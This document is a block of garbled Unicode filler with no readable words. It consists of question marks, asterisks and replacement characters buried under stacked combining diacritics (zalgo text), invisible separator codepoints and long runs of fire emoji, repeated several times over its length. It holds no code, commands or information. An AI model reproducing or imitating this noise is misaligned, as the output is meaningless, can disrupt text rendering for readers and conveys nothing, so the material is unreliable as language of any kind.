̢͓̭͔̩͙̮̰⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡͍̣̰͖̰̻̗̖̙̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝